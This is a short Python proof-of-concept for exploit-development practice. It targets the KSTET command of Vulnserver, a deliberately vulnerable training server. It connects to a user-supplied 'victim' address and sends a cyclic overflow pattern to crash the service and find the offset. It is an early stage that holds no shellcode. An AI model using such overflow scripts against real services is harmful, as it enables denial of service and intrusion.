#!/usr/bin/env python3
print ("# #########################################")
print ("#  POC KSTET instruction | Vulnserver  ####")
print ("#     Practice OSCE | Exploit Dev      ####")
print ("#           Exploit By r0r0x_xxx       ####")
print ("#           Date: 29-10-2020 	       ####")
print ("#             Socket Reuse   	       ####")
print ("###########################################")

#Banner

print (" _    _                         _    _            _    _             ")
print ("| |  | |                       | |  | |          | |  (_)            ")
print ("| |__| | __ _ _ __  _ __  _   _| |__| | __ _  ___| | ___ _ __   __ _ ")
print ("|  __  |/ _` | '_ \| '_ \| | | |  __  |/ _` |/ __| |/ / | '_ \ / _` |")
print ("| |  | | (_| | |_) | |_) | |_| | |  | | (_| | (__|   <| | | | | (_| |")
print ("|_|  |_|\__,_| .__/| .__/ \__, |_|  |_|\__,_|\___|_|\_\_|_| |_|\__, |")
print ("             | |   | |     __/ |                                __/ |")
print ("             |_|   |_|    |___/                                |___/ ")

from socket import socket, AF_INET, SOCK_STREAM, timeout, error
from sys import exit

timeout_val = 5 # Seconds
host = input("Enter the victim ip address: ")
port = input("Enter the remote port of the victim: ")
victim = ((host, int(port)))

#/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 681
payload = b""
payload += b"KSTET /.:/"
payload += b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6"
payload += b"\r\n"

if __name__ == '__main__':
    print('[*] creating the socket :D')
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(timeout_val)
    try:
        print('[*] connecting to the Windows VM')
        s.connect(victim)
        print('[*] sending BOMB...')
        s.send(payload)
        print('[*] Chao')
        s.close()
    except timeout:
        print('[!] socket timeout occurred, Check the application dude?')
        print('\Check the debugger')
        exit(1)
    except error:
        print('[!] The socket does not work, Dude wake up')
        exit(1)
